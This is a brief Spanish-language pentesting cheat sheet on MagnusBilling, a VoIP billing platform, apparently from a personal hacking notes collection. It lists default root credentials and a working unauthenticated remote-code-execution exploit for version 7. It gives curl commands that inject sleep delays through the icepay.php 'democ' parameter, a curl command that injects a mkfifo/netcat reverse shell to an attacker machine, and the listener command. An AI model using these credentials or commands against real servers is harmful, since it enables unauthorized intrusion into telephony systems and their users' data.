# Magnus Billing 

Tags: #MagnusBilling 

MagnusBilling, una plataforma de telefonía IP (VoIP) utilizada para administrar servicios de llamadas telefónicas.

Se utiliza principalmente para gestionar centrales telefónicas basadas en tecnologías como Asterisk, controlar extensiones, configurar proveedores SIP, administrar usuarios y llevar registros de llamadas y facturación.

En ciberseguridad es relevante porque, como cualquier aplicación web que administra servicios de telefonía, una instalación vulnerable o mal configurada podría exponer información o permitir acciones no autorizadas.

```bash 
# Credenciales por defecto
	root:magnus 
	root:9F4CA770B638615AC5C3E0D2DA16B77C80C2F2C6
```

## Unauth RCE - versión 7
* [PoC](https://eldstal.se/advisories/230327-magnusbilling.html)
```bash 
# Verificar si se tiene un delay. Si es así existe la vulnerabilidad
❯ time curl -s 'http://IP/mbilling/lib/icepay/icepay.php?democ=;sleep+2;'

❯ time curl -s 'http://IP/mbilling/lib/icepay/icepay.php?democ=;sleep+5;'
```

```bash 
# Revershell 
❯ curl -s 'http://IP/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP_Kali 443 >/tmp/f;'

❯ rlwrap nc -nlvp 443   # Ponerse en escucha en Kali 
```